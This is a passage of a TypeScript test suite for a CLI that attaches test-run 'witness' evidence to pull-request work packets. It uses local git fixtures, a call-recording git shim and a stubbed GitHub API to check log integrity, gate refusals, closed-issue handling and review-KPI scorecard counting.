 * This is bash's own documented startup sequence rather than a platform quirk: a *login* shell
 * sources `/etc/profile` and then the first of `~/.bash_profile`, `~/.bash_login`, `~/.profile`;
 * `bash -c` sources none of them. So the marker is present exactly when the witness ran the shell
 * the contract forbids — on Linux and CI as much as on the macOS machine where `path_helper`
 * happened to be the mechanism that cost issue #41 its interpreter.
 */
function loginShellProfile(home: string): void {
  const marker = `export ${LOGIN_SHELL_MARKER}=1\n`;
  mkdirSync(home, { recursive: true });
  writeFileSync(join(home, ".bash_profile"), marker);
  writeFileSync(join(home, ".profile"), marker);
}

/**
 * A git repo standing in for the Wave 0 target. Head is green under the allowlist's real
 * `testCommand`; reverting the one non-test file to base makes it red, so the negative control
 * genuinely goes red instead of being asserted. Built once — the CLI only ever clones from it.
 */
let originRepo: { path: string; base: string; head: string } | undefined;
function wave0Origin(): { path: string; base: string; head: string } {
  if (originRepo) return originRepo;
  const path = evidenceScratchDir("foundry-origin-");
  const git = (...args: string[]) => {
    const run = spawnSync(
      "git",
      ["-C", path, "-c", "user.email=fixture@example.invalid", "-c", "user.name=Fixture", "-c", "commit.gpgsign=false", ...args],
      // The fixture must not inherit the developer's global git config (signing keys, hooks,
      // templates); the CLI child gets its own global config below.
      { encoding: "utf8", env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null" } },
    );
    assert.equal(run.status, 0, `git ${args.join(" ")}: ${run.stdout}${run.stderr}`);
    return run.stdout.trim();
  };
  const write = (rel: string, text: string) => {
    mkdirSync(join(path, dirname(rel)), { recursive: true });
    writeFileSync(join(path, rel), text);
  };

  const init = spawnSync("git", ["init", "-q", "-b", "main", path], {
    encoding: "utf8",
    env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null" },
  });
  assert.equal(init.status, 0, `git init: ${init.stdout}${init.stderr}`);
  const suite = (expected: string) =>
    `import unittest\n\n\nclass AnswerTest(unittest.TestCase):\n    def test_answer(self):\n        with open("src/answer.txt") as handle:\n            self.assertEqual(handle.read().strip(), "${expected}")\n`;
  // Not `sys.exit(0)`. The allowlist's `testCommand` is fixed (`python3 scripts/validate.py && …`)
  // and the headline criterion is that it runs unedited, so the *repo* is where this fixture gets
  // to care which shell invoked it. `validate.py` is the first thing that command runs, and it
  // fails the run when the witness's shell sourced a login profile — which is precisely the
  // condition under which macOS `path_helper` re-resolved `python3` to 3.9.6 in issue #41.
  write(
    "scripts/validate.py",
    "import os\nimport sys\n\n" +
      `if os.environ.get(${JSON.stringify(LOGIN_SHELL_MARKER)}):\n` +
      '    sys.stderr.write("validate.py: the witness ran a LOGIN shell — see issue #41\\n")\n' +
      "    sys.exit(1)\n\nsys.exit(0)\n",
  );
  write("src/answer.txt", "wrong\n");
  write("tests/test_answer.py", suite("wrong"));
  git("add", "-A");
  git("commit", "-q", "-m", "base");
  const base = git("rev-parse", "HEAD");

  write("src/answer.txt", "right\n");
  write("tests/test_answer.py", suite("right"));
  git("add", "-A");
  git("commit", "-q", "-m", "fix the answer\n\nFixes #71");
  const head = git("rev-parse", "HEAD");
  git("config", "uploadpack.allowAnySHA1InWant", "true");

  originRepo = { path, base, head };
  return originRepo;
}

/**
 * A `git` on the child's PATH that appends every invocation to a file and then execs the real one.
 * This is the injected runner the ordering test reads: `witnessEvidence`'s very first act on the
 * host path is `git clone`, so an empty record is proof the witness never ran — not an inference
 * from how long the refusal took. The positive control in the same test runs a well-bound range
 * through the same shim and sees the clone recorded, so an empty record cannot mean a dead shim.
 */
function recordingGit(dir: string): { binDir: string; record: string; calls: () => string[] } {
  const realGit = spawnSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).stdout.trim();
  assert.match(realGit, /git$/, "the shim needs a real git to delegate to");
  const binDir = join(dir, "bin");
  mkdirSync(binDir, { recursive: true });
  const record = join(dir, "git-calls.log");
  const shim = join(binDir, "git");
  writeFileSync(shim, `#!/bin/sh\nprintf '%s\\n' "$*" >> ${JSON.stringify(record)}\nexec ${JSON.stringify(realGit)} "$@"\n`);
  chmodSync(shim, 0o755);
  return {
    binDir,
    record,
    calls: () => {
      try {
        return readFileSync(record, "utf8").split("\n").filter(Boolean);
      } catch {
        return [];
      }
    },
  };
}

/**
 * A work tree the `evidence` verb can be run in: the ledger holding the Wave 0 packet in
 * `reviewing`, a `compareCommits` stub reporting `filesChanged` files, and a git config that
 * rewrites the upstream clone URL to the local origin so nothing touches the network. `message` is
 * what the stubbed compare reports as the range's commit message — the input the binding is
 * decided from, and the only thing the ordering test varies.
 */
function evidenceFixture(filesChanged = 2, message = "fix the answer\n\nFixes #71") {
  const origin = wave0Origin();
  const dir = evidenceScratchDir("foundry-evidence-");
  const { state, id } = reviewing();
  assert.equal(state.packets[0].repoId, "ravidsrk/orca-fleet", "the evidence verb is host/Wave 0 only");
  writeFileSync(join(dir, ".foundry-state.json"), JSON.stringify(state));

  const canned = {
    status: "ahead",
    ahead_by: 1,
    behind_by: 0,
    files: Array.from({ length: filesChanged }, () => ({ additions: 1, deletions: 1 })),
    commits: [{ commit: { message } }],
  };
  const stub = join(dir, "stub-github.mjs");
  writeFileSync(
    stub,
    `const canned = ${JSON.stringify(canned)};\n` +
      `globalThis.fetch = async (url) => {\n` +
      `  const u = String(url);\n` +
      `  if (u.includes("/compare/")) {\n` +
      `    return new Response(JSON.stringify(canned), { status: 200, headers: { "content-type": "application/json" } });\n` +
      `  }\n` +
      `  throw new Error("unstubbed fetch: " + u);\n` +
      `};\n`,
  );

  const gitconfig = join(dir, "gitconfig");
  writeFileSync(gitconfig, `[url "${origin.path}"]\n\tinsteadOf = https://github.com/ravidsrk/orca-fleet.git\n`);

  // The trap the shell contract is measured with. `GIT_CONFIG_GLOBAL` above already keeps git off
  // this `HOME`, so the only thing in it is the profile a login shell would source and the witness
  // must not. It is inert against correct code and fatal against `bash -lc`.
  const home = join(dir, "home");
  loginShellProfile(home);

  const logPaths = [
    join(dir, "docs", "evidence", "logs", id, "test.log"),
    join(dir, "docs", "evidence", "logs", id, "revert.log"),
  ];
  const git = recordingGit(dir);
  const childEnv = {
    GIT_CONFIG_GLOBAL: gitconfig,
    HOME: home,
    PATH: `${git.binDir}:${process.env.PATH ?? ""}`,
  };
  const runEvidence = () =>
    runCli(dir, ["evidence", id, "--base", origin.base, "--head", origin.head], stub, childEnv);
  /** The pre-flight, run from the same working directory and the same environment as the witness. */
  const runWitnessCheck = () => runCli(dir, ["witness-check", "ravidsrk/orca-fleet"], stub, childEnv);
  return { dir, id, origin, logPaths, runEvidence, runWitnessCheck, gitCalls: git.calls };
}

function exists(path: string): boolean {
  try {
    readFileSync(path);
    return true;
  } catch {
    return false;
  }
}

test("the evidence verb writes the run logs its own ledger entry points at", () => {
  const { dir, id, origin, logPaths, runEvidence } = evidenceFixture();

  const run = runEvidence();
  assert.equal(run.status, 0, run.seen);
  assert.match(run.stdout, new RegExp(`evidence attached ${id}`));

  const witness = ledgerAt(dir).packets[0].evidence?.witness;
  assert.ok(witness, run.seen);
  assert.equal(witness!.provider, "host");
  assert.equal(witness!.baseSha, origin.base);
  assert.equal(witness!.headSha, origin.head);
  assert.equal(witness!.testExit, 0);
  assert.notEqual(witness!.revertExit, 0, "the negative control ran and went red for real");

  // The point of the whole exercise: the paths the ledger and the evidence page name resolve to
  // files, and those files hash to the digests the page offers the maintainer.
  for (const path of logPaths) assert.ok(exists(path), `${path} was never written: ${run.seen}`);
  const read = (rel: string) => {
    try {
      return readFileSync(join(dir, rel), "utf8");
    } catch {
      return undefined;
    }
  };
  assert.equal(verifyWitnessLogs(witness!, read).ok, true, "the maintainer's recompute must succeed");
  // ...and the two logs are different files, not one result copied twice.
  assert.notEqual(read(witness!.testLogPath!), read(witness!.revertLogPath!));
});

test("the evidence verb runs the repo's command in the non-login shell the contract promises", () => {
  // Issue #41 at the only place an operator meets it. `hostRunner`'s shell is asserted directly in
  // `witness-host.test.ts`, but the `evidence` verb reaches it through exactly one argument —
  // `hostRunner,` at the `witnessEvidence` call in cli.ts — and that argument was held by nothing.
  // Swapping in a `bash -lc` runner there restored #41's defect on the operator's real path and
  // the whole suite stayed green, because the fixture repo's `validate.py` was `sys.exit(0)`.
  //
  // So the fixture repo now refuses a login shell, and the allowlist's `testCommand` runs unedited
  // over it. This is the CLI's own child process: nothing about the shell is stubbed.
  const { dir, runEvidence } = evidenceFixture();
  assert.ok(
    readFileSync(join(dir, "home", ".bash_profile"), "utf8").includes(LOGIN_SHELL_MARKER),
    "the trap must actually be armed, or this test passes by not springing it",
  );

  const run = runEvidence();
  assert.equal(
    run.status,
    0,
    `the witness ran a login shell (issue #41) — a login bash sources ~/.bash_profile, and the ` +
      `repo's own testCommand refused on the marker it exports:\n${run.seen}`,
  );
  assert.doesNotMatch(run.seen, /LOGIN shell/, run.seen);
  assert.ok(ledgerAt(dir).packets[0].evidence?.witness, run.seen);
});

test("the toolchain the witness records is the one witness-check predicted for the same repo", () => {
  // The pre-flight's entire value is that it cannot disagree with the run (witness.ts's
  // `hostRunner` docstring, docs/10-schemas.md). Nothing checked the two agree, so a witness
  // resolving through a different shell than the pre-flight — a green pre-flight and a red
  // witness, the #41 shape — was invisible. Both halves run here, from one working directory.
  const { dir, runEvidence, runWitnessCheck } = evidenceFixture();

  const preflight = runWitnessCheck();
  assert.equal(preflight.status, 0, preflight.seen);
  const predicted = /^ {2}toolchain a witness from here would record: (.+)$/m.exec(preflight.stdout)?.[1];
  assert.ok(predicted, `the pre-flight named no toolchain at all:\n${preflight.seen}`);
  assert.notEqual(predicted, "(none resolved)", `no python3 on this machine: ${preflight.seen}`);
  assert.match(predicted!, /^python3 \d+\.\d+/, preflight.seen);

  const run = runEvidence();
  assert.equal(run.status, 0, run.seen);
  const witness = ledgerAt(dir).packets[0].evidence?.witness;
  assert.ok(witness, run.seen);
  // Not "the witness recorded something" — the same string, both sides resolved through the same
  // shell. `witness-check` resolves in the operator's working directory and the witness resolves
  // inside the clone, so a repo pinning its interpreter may legitimately part them (see
  // docs/08-operations.md); this fixture's clone pins nothing, so parting them here means the two
  // paths stopped sharing a shell.
  assert.equal(
    witness!.toolchain,
    predicted,
    `witness-check predicted \`${predicted}\` and the witness recorded \`${witness!.toolchain}\` — ` +
      `the pre-flight and the run resolved through different shells:\n${run.seen}`,
  );
});

test("an evidence run refused at the gate leaves no orphan logs behind", () => {
  // Ordering, not existence. `persistWitnessLogs` sits *after* the `applyAttachEvidence` error
  // check; moving it back above — where it was — leaves two logs on disk with no ledger entry
  // pointing at them, which is precisely what a maintainer cannot later recompute against.
  // 20 files is over orca-fleet's cap of 8, so the witness succeeds and the gate then refuses.
  const { dir, id, logPaths, runEvidence } = evidenceFixture(20);

  const run = runEvidence();
  assert.equal(run.status, 1, run.seen);
  assert.match(run.seen, /would touch 20 files; cap is 8/, run.seen);

  const after = ledgerAt(dir).packets[0];
  assert.equal(after.status, "parked", "the overflow parks the packet, and that much is saved");
  assert.equal(after.evidence, undefined, "a refusal must not write evidence");
  for (const path of logPaths) {
    assert.equal(exists(path), false, `${path} was written for a run the ledger refused`);
  }
  // The refusal is also the state the operator recovers from: nothing on disk claims a witness.
  assert.equal(runCli(dir, ["advance", id]).status, 1);
});

test("the evidence verb does not narrate a clone it will not perform", () => {
  // The progress line printed "cloning and running `npm test` twice" immediately before
  // `witnessEvidence` refused a sandboxed repo without touching the network. The operator's
  // terminal is a claim surface: a line describing work that never happened is the same defect
  // class as a pointer nobody can follow.
  const { dir, id, stub } = ingestFixture();
  const run = runCli(dir, ["evidence", id, "--base", BASE, "--head", HEAD], stub, {
    E2B_API_KEY: "",
  });
  assert.equal(run.status, 1, run.seen);
  assert.doesNotMatch(run.seen, /cloning/, run.seen);
  // ...and it still says what it is doing, and where the operator goes next.
  assert.match(run.seen, /this CLI does not run e2b sandboxes/);
  assert.match(run.seen, new RegExp(`attach-witness ${id} --manifest <path>`));
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
});

test("attach-witness saves the park when the compared range busts the cap", () => {
  // The parked-state save on the ingest path was reachable by no test: deleting the
  // `if (parked) saveFactoryState(...)` line left the suite green, and the operator would then
  // re-run into the same refusal with no record that the packet had been parked at all.
  // awesome-copilot's cap is 3 files; the stub reports 10.
  const { dir, id, manifestPath, stub } = ingestFixture({}, {}, 10);
  assert.equal(ledgerAt(dir).packets[0].status, "reviewing");

  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 1, run.seen);
  assert.match(run.seen, /would touch 10 files; cap is 3/, run.seen);

  const after = ledgerAt(dir).packets[0];
  assert.equal(after.status, "parked", "the park must survive the refusal, not vanish with the process");
  assert.equal(after.evidence, undefined, "parked is not attached");
  assert.match(after.parkReason ?? "", /cap is 3/);
});

test("a witness whose two logs hash the same is not a negative control", () => {
  // `testCommand: "true"` produces no output at all, so both runs hash to sha256 of the empty
  // string and the evidence page offers `e3b0c442…` twice as its recompute. The exit codes can
  // still differ, so `revertExit !== 0` does not catch it — the digests have to.
  const empty = createHash("sha256").update("").digest("hex");
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const attached = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id, { testLogSha: empty, revertLogSha: empty })),
    bindingFor(packet),
  );
  assert.match(attached.error ?? "", /hash to the same sha256 e3b0c44/);
  assert.equal(attached.state.packets[0].evidence, undefined);
  // And the gate agrees, so a ledger edited around the reducer cannot promote it either.
  const forged: FactoryState = {
    ...state,
    packets: state.packets.map((p) =>
      p.id === id
        ? {
            ...p,
            evidence: {
              ...manifestWith(
                boundWitness("e2b", packet.repoId, id, { testLogSha: empty, revertLogSha: empty }),
              ),
              shaVerified: true,
            },
          }
        : p,
    ),
  };
  assert.equal(evidenceIsReady(forged.packets[0]), false);
});

test("attach-witness refuses identical log digests even when both logs are on disk", () => {
  // End to end, because this is the shape an honest-looking manifest takes: the two files exist,
  // the hashes recompute correctly, `verifyWitnessLogs` is satisfied — and the pair still proves
  // nothing. The refusal has to come from the gate, after the read succeeds.
  const empty = createHash("sha256").update("").digest("hex");
  const { dir, id, manifestPath, stub } = ingestFixture(
    { testLogSha: empty, revertLogSha: empty },
    { test: "", revert: "" },
  );
  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 1, run.seen);
  assert.doesNotMatch(run.seen, /does not match the witness sha256/, "the read itself must succeed");
  assert.match(run.seen, /hash to the same sha256/, run.seen);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
});

test("a mis-bound range is refused before the witness runs at all", () => {
  // Ordering proved by observation, not by stopwatch (issue #42). Every `git` the CLI child spawns
  // goes through a shim that records it, and `witnessEvidence`'s first act on the host path is
  // `git clone` — so the claim "the witness never ran" is the record being empty, not the refusal
  // being fast.

  // Positive control first: the recorder is live, and a well-bound range does clone and run twice.
  const bound = evidenceFixture();
  const green = bound.runEvidence();
  assert.equal(green.status, 0, green.seen);
  const clones = bound.gitCalls().filter((line) => line.startsWith("clone "));
  assert.equal(clones.length, 1, `the shim must see the witness clone: ${bound.gitCalls().join(" | ")}`);
  for (const path of bound.logPaths) assert.ok(exists(path), `${path} was never written: ${green.seen}`);

  // Same fixture, same verb, one input changed: a commit range that names no issue at all.
  const { dir, id, logPaths, runEvidence, gitCalls } = evidenceFixture(2, "unrelated refactor");
  const run = runEvidence();
  assert.equal(run.status, 1, run.seen);
  // This assertion, and not the wall clock, is the claim: no git at all.
  assert.deepEqual(gitCalls(), [], `the witness ran for a range the gate refuses: ${run.seen}`);
  assert.match(run.seen, /does not reference ravidsrk\/orca-fleet#71/, run.seen);
  // ...and therefore neither run happened, so neither log exists.
  for (const path of logPaths) assert.equal(exists(path), false, `${path} was written for a refused range`);
  // ...and the terminal did not narrate a clone it never performed.
  assert.doesNotMatch(run.seen, /cloning/, run.seen);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
  assert.equal(ledgerAt(dir).packets[0].status, "reviewing", "a refusal at the pre-check parks nothing");
  assert.equal(runCli(dir, ["advance", id]).status, 1);
});

test("the pre-check does not let a foreign reference through the evidence verb", () => {
  // The security-relevant half: relaxing the matcher must not start binding someone else's issue
  // number. Driven through the real verb so the pre-check and the reducer are both on the path.
  const { dir, runEvidence, gitCalls } = evidenceFixture(2, "fix the answer\n\nFixes other-owner/other-repo#71");
  const run = runEvidence();
  assert.equal(run.status, 1, run.seen);
  assert.deepEqual(gitCalls(), [], `a foreign reference bought a clone: ${run.seen}`);
  assert.match(run.seen, /does not reference ravidsrk\/orca-fleet#71/, run.seen);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
});

/**
 * The closed-issue verdict (issue #40). Deliberately a sibling of `classifyCompetition`: same
 * question shape — a live GitHub fact the CLI fetches and the engine judges — and the same posture
 * word, "stand down", that docs/02-good-neighbor.md rule 8 uses for a competing PR.
 */
test("issueStandDownReason refuses a closed issue and names why, and passes an open one", () => {
  const target = { repoId: "ravidsrk/orca-fleet", issueNumber: 71 };

  assert.equal(
    issueStandDownReason(target, { state: "open", isPullRequest: false }),
    undefined,
    "an open issue is the whole point; the gate must not fire on it",
  );
  assert.equal(
    issueStandDownReason(target, { state: "open", stateReason: "reopened", isPullRequest: false }),
    undefined,
    "a reopened issue is open",
  );

  const completed = issueStandDownReason(
    target,
    { state: "closed", stateReason: "completed", isPullRequest: false, closedBy: "ravidsrk" },
    "https://github.com/ravidsrk/orca-fleet/pull/72",
  );
  assert.ok(completed);
  assert.match(completed!, /ravidsrk\/orca-fleet#71/);
  assert.match(completed!, /closed/);
  // `/ravidsrk/` alone would be satisfied by the repo id in the key, so pin the phrase.
  assert.match(completed!, /closed by ravidsrk/, "who closed it");
  assert.match(completed!, /pull\/72/, "the closing reference, so the operator can go look");

  // `not_planned` is a different message because it is a different fact: nobody fixed this, the
  // maintainers decided against it. An operator reading "already resolved" would go looking for a
  // fix that does not exist.
  const notPlanned = issueStandDownReason(target, {
    state: "closed",
    stateReason: "not_planned",
    isPullRequest: false,
  });
  assert.ok(notPlanned);
  assert.match(notPlanned!, /not planned/i);
  assert.equal(/already/i.test(notPlanned!), false, "nothing resolved a not-planned issue");

  // No `state_reason` at all (GitHub returns null on older closes) still refuses.
  const bare = issueStandDownReason(target, { state: "closed", isPullRequest: false });
  assert.ok(bare, "a closed issue with no reason is still closed");

  // A roster row naming a pull request number is a config error, not a scoutable issue.
  const isPr = issueStandDownReason(target, { state: "open", isPullRequest: true });
  assert.ok(isPr);
  assert.match(isPr!, /pull request/i);
  assert.match(isPr!, /allowlist/i, "the fix is in allowlist.yaml, so the message says so");
});

test("tick skips a closed named issue and records why, without consuming the row", () => {
  // The wiring, not just the predicate. `pickCandidate` falls back to walking `allowlist.yaml`'s
  // `firstIssues` directly, so leaving a closed issue out of `live` does NOT stop it being
  // selected — only the blocked set does. Drop `closedIssues` from that set and this goes green
  // again while the factory scouts an issue GitHub closed.
  const closed = applyTick(blank(), [], [], [], [
    { key: "ravidsrk/orca-fleet#71", reason: "ravidsrk/orca-fleet#71 is closed (completed) by ravidsrk" },
  ]);
  assert.ok(closed.packet, "the tick must move on to the next named row, not idle");
  assert.notEqual(`${closed.packet!.repoId}#${closed.packet!.issueNumber}`, "ravidsrk/orca-fleet#71");
  assert.ok(
    closed.state.events.some(
      (e) => /ravidsrk\/orca-fleet#71/.test(e.message) && /closed \(completed\) by ravidsrk/.test(e.message),
    ),
    `the ledger must say why a named row went unscouted:\n${JSON.stringify(closed.state.events, null, 2)}`,
  );

  // Skipped, never consumed: nothing is written against the issue, so a reopen makes it selectable
  // on the next tick with no hand edit. (Issue #40 asks for this by pointing at "the parked-issue
  // stranding issue"; no such issue exists in this repo's tracker — untracked — so the requirement
  // is pinned here instead of cited.)
  assert.equal(
    closed.state.packets.some((p) => p.issueNumber === 71),
    false,
    "a skip must not leave a packet behind",
  );
  // Tick again over the ledger the skip produced — events and all — with only the live fact
  // changed back. (The packet the first tick scouted is dropped first: it holds the one in-flight
  // slot, which would abort the second tick for an unrelated reason.)
  const slotFree = {
    ...closed.state,
    packets: closed.state.packets.filter((p) => p.id !== closed.packet!.id),
  };
  const reopened = applyTick(slotFree, [], [], [], []);
  assert.equal(
    `${reopened.packet?.repoId}#${reopened.packet?.issueNumber}`,
    "ravidsrk/orca-fleet#71",
    "with the issue open again the same row is selectable, no hand edit required",
  );
});

/* ------------------------------------------------------------------------------------------- *
 * issue #39 — the three 90-day KPIs that no code path could compute.
 * ------------------------------------------------------------------------------------------- */

test("applyReviewToScorecard writes noReview only on zero human review activity", () => {
  const repo = "ravidsrk/orca-fleet";
  const silent = applyReviewToScorecard(emptyScorecard(), repo, { reviews: 0, comments: 0 });
  const row = scorecardRow(silent, repo)!;
  assert.equal(row.noReview, 1, "a terminal PR nobody human reviewed is the noReview counter");
  assert.equal(row.humanReviewedPrs, 0, "silence is not a review-comment observation");
  assert.equal(row.reviewCommentsAvg, 0);

  // A bare approval is review ACTIVITY with no review COMMENT: it is not noReview, and it is not
  // in the reviewCommentsAvg denominator either. Collapsing the two counts loses exactly this row.
  const approved = applyReviewToScorecard(emptyScorecard(), repo, { reviews: 1, comments: 0 });
  const approvedRow = scorecardRow(approved, repo)!;
  assert.equal(approvedRow.noReview, 0, "a human approved it — that is review activity");
  assert.equal(approvedRow.humanReviewedPrs, 0, "an approval with no comment is not a comment");
});

test("reviewCommentsAvg is a mean over PRs with ≥1 human review comment, not over all terminal PRs", () => {
  const repo = "ravidsrk/orca-fleet";
  // The live shape of ravidsrk/orca-fleet on 2026-08-29: #70 drew one human review comment, #72
  // drew none. The documented denominator is PRs with ≥1 human review comment — so the mean is
  // 1/1 = 1, NOT the 1/2 = 0.5 that was typed into the seed by hand.
  let rows = applyReviewToScorecard(emptyScorecard(), repo, { reviews: 1, comments: 1 });
  rows = applyReviewToScorecard(rows, repo, { reviews: 0, comments: 0 });
  const row = scorecardRow(rows, repo)!;
  assert.equal(row.humanReviewComments, 1);
  assert.equal(row.humanReviewedPrs, 1);
  assert.equal(row.reviewCommentsAvg, 1, "the silent PR is counted by noReview, not by the mean");
  assert.equal(row.noReview, 1);

  // Two reviewed PRs, 1 and 4 comments → mean 2.5. Exact, because the mean is recomputed from the
  // stored sum and denominator rather than folded into itself.
  let more = applyReviewToScorecard(emptyScorecard(), repo, { reviews: 1, comments: 1 });
  more = applyReviewToScorecard(more, repo, { reviews: 1, comments: 4 });
  assert.equal(scorecardRow(more, repo)!.reviewCommentsAvg, 2.5);
  assert.equal(scorecardRow(more, repo)!.humanReviewComments, 5);
  assert.equal(scorecardRow(more, repo)!.humanReviewedPrs, 2);
});

test("an unobserved review split moves no counter at all", () => {
  const repo = "ravidsrk/orca-fleet";
  const rows = applyReviewToScorecard(emptyScorecard(), repo, undefined);
  const row = scorecardRow(rows, repo)!;
  assert.equal(row.noReview, 0, "'we could not read it' is not 'nobody reviewed it'");
  assert.equal(row.humanReviewedPrs, 0);
  assert.equal(row.reviewCommentsAvg, 0);
});

test("classifyRevert names the reverting commit, and only inside the 30-day window", () => {
  const merge = "36d0f23708adbdf911e4df050ed516821278a9fc";
  const mergedAt = "2026-08-27T07:04:52Z";

  const hit = classifyRevert({
    mergeCommitSha: merge,
    mergedAt,
    commits: [
      {
        sha: "ffff1110000000000000000000000000000000aa",
        message: `Revert "fix validator"\n\nThis reverts commit ${merge}.`,
        committedAt: "2026-08-28T09:00:00Z",
      },
    ],
  });
  assert.equal(hit.reverted, true);
  if (hit.reverted) {
    assert.equal(hit.sha, "ffff1110000000000000000000000000000000aa");
    assert.equal(hit.at, "2026-08-28T09:00:00Z");
  }

  // git abbreviates in a hand-written revert body; a prefix of our merge commit still names it.
  const abbreviated = classifyRevert({
    mergeCommitSha: merge,
    mergedAt,
    commits: [{ sha: "aaaa111", message: "This reverts commit 36d0f237.", committedAt: "2026-08-28T09:00:00Z" }],
  });
  assert.equal(abbreviated.reverted, true);

  // docs/08-operations.md: "Post-merge edits/refactors of our code are rework, tracked as
  // informational notes, never counted as reverts." Rework is excluded structurally — nothing but
  // a commit naming our merge commit can ever reach the counter.
  const rework = classifyRevert({
    mergeCommitSha: merge,
    mergedAt,
    commits: [
      { sha: "bbbb222", message: "refactor the validator introduced in #70", committedAt: "2026-08-28T09:00:00Z" },
      { sha: "cccc333", message: "This reverts commit 0123456789abcdef0123456789abcdef01234567.", committedAt: "2026-08-28T09:00:00Z" },
    ],
  });
  assert.equal(rework.reverted, false);
  if (!rework.reverted) assert.match(rework.why, /no commit/i);

  // 31 days out: the definition names 30, so this is not a revert and must say why.
  const late = classifyRevert({
    mergeCommitSha: merge,
    mergedAt,
    commits: [{ sha: "dddd444", message: `This reverts commit ${merge}.`, committedAt: "2026-09-27T09:00:00Z" }],
  });
  assert.equal(late.reverted, false);
  if (!late.reverted) assert.match(late.why, /30-day/);

  // The merge commit cannot revert itself, and nothing before the merge can revert it.
  const self = classifyRevert({
    mergeCommitSha: merge,
    mergedAt,
    commits: [{ sha: merge, message: `This reverts commit ${merge}.`, committedAt: mergedAt }],
  });
  assert.equal(self.reverted, false);
});

test("applyPrSync writes noReview on the merge transition and names the packet it read", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  const before = scorecardRow(state.scorecard, submitted.repoId)!.noReview;
  const merged = applyPrSync(
    state,
    submitted.id,
    prMetaAt("2026-09-01T00:00:00.000Z", {
      merged: true,
      state: "closed",
      humanReview: { reviews: 0, comments: 0 },
    }),
    { threadsAnswered: true, at: "2026-09-02T00:00:00.000Z" },
  );
  assert.equal(merged.error, undefined);
  const row = scorecardRow(merged.state.scorecard, submitted.repoId)!;
  assert.equal(row.noReview, before + 1);
  assert.equal(row.humanReviewedPrs, 0);
  const said = merged.state.events.find((e) => e.message.includes("no human review"));
  assert.ok(said, `the merge must say what it recorded:\n${merged.state.events.map((e) => e.message).join("\n")}`);
  assert.equal(said!.packetId, submitted.id);
  assert.match(said!.message, /noReview/);
});

test("applyPrSync folds review comments into the mean on the closedUnmerged transition", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  const closed = applyPrSync(
    state,
    submitted.id,
    prMetaAt("2026-09-01T00:00:00.000Z", {
      state: "closed",
      humanReview: { reviews: 2, comments: 3 },
    }),
    { threadsAnswered: true, at: "2026-09-02T00:00:00.000Z" },
  );
  assert.equal(closed.error, undefined);
  const row = scorecardRow(closed.state.scorecard, submitted.repoId)!;
  assert.equal(row.closedUnmerged, 1);
  assert.equal(row.humanReviewComments, 3);
  assert.equal(row.humanReviewedPrs, 1);
  assert.equal(row.reviewCommentsAvg, 3);
  assert.equal(row.noReview, 0, "three human review comments is not silence");
  assert.ok(
    closed.state.events.some((e) => /reviewCommentsAvg now 3 over 1 reviewed PR/.test(e.message)),
    `the close must say what it recorded, in words the not-observed branch cannot also produce:\n${closed.state.events.map((e) => e.message).join("\n")}`,
  );

  // Edge-triggered like closedUnmerged itself: re-syncing an already-closed PR must not inflate
  // the mean's denominator.
  const again = applyPrSync(
    closed.state,
    submitted.id,
    prMetaAt("2026-09-03T00:00:00.000Z", { state: "closed", humanReview: { reviews: 2, comments: 3 } }),
    { threadsAnswered: true, at: "2026-09-04T00:00:00.000Z" },
  );
  const twice = scorecardRow(again.state.scorecard, submitted.repoId)!;
  assert.equal(twice.humanReviewedPrs, 1, "a second sync of the same close is not a second PR");
  assert.equal(twice.humanReviewComments, 3);
});

test("a terminal transition with no observed review split records nothing and says so", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  const merged = applyPrSync(
    state,
    submitted.id,
    prMetaAt("2026-09-01T00:00:00.000Z", { merged: true, state: "closed" }),
    { threadsAnswered: true, at: "2026-09-02T00:00:00.000Z" },
  );
  const row = scorecardRow(merged.state.scorecard, submitted.repoId)!;
  assert.equal(row.noReview, 0, "an unread endpoint must not be recorded as silence");
  assert.equal(row.humanReviewedPrs, 0);
  const messages = merged.state.events.map((e) => e.message);
  assert.ok(
    messages.some((m) => m.includes("Human review not observed")),
    `the gap must be stated, not skipped silently:\n${messages.join("\n")}`,
  );
  // And it must NOT be confusable with the real thing: the recorded-silence wording is absent.
  assert.equal(
    messages.some((m) => m.includes("no human review")),
    false,
    "'not observed' must not be reported with the same words as 'nobody reviewed it'",
  );
  // The remedy it names has to be one that works (issue #39 round 3). This line said "re-sync",
  // and `sync` routes through `applyPrSync`, whose status guard answers `cannot sync PR from
  // status merged` — the operator was being sent at a verb that refuses the packet by design. The
  // same defect class this unit had already fixed once, reintroduced in the commit that fixed it.
  const gap = messages.find((m) => m.includes("Human review not observed"))!;
  assert.match(gap, /run `reconcile`/, `the advice must name the verb that recovers it:\n${gap}`);
  assert.equal(
    /re-sync/.test(gap),
    false,
    `\`sync\` refuses a terminal packet, so naming it is advice that cannot be followed:\n${gap}`,
  );
  // Not a claim about the wording — a claim about the verb. `sync` really does refuse this packet.
  const refused = applyPrSync(
    merged.state,
    submitted.id,
    prMetaAt("2026-09-03T00:00:00.000Z", { merged: true, state: "closed" }),
    { threadsAnswered: true, at: "2026-09-04T00:00:00.000Z" },
  );
  assert.match(
    refused.error ?? "",
    /cannot sync PR from status merged/,
    "if this ever starts succeeding, the advice above should change back",
  );
  // And `reconcile`'s writer is the one that does work on the very same packet.
  const recovered = applyReviewObservation(merged.state, submitted.id, { reviews: 1, comments: 2 });
  assert.equal(recovered.error, undefined, recovered.error);
  assert.equal(recovered.recorded, true, "the named remedy must actually move the KPI");
  assert.equal(scorecardRow(recovered.state.scorecard, submitted.repoId)!.humanReviewedPrs, 1);
});

test("the review-KPI writer and reporter share one predicate, so they cannot disagree", () => {
  // Three times in issue #39 one consumer of a fact was pinned and its sibling was not. The
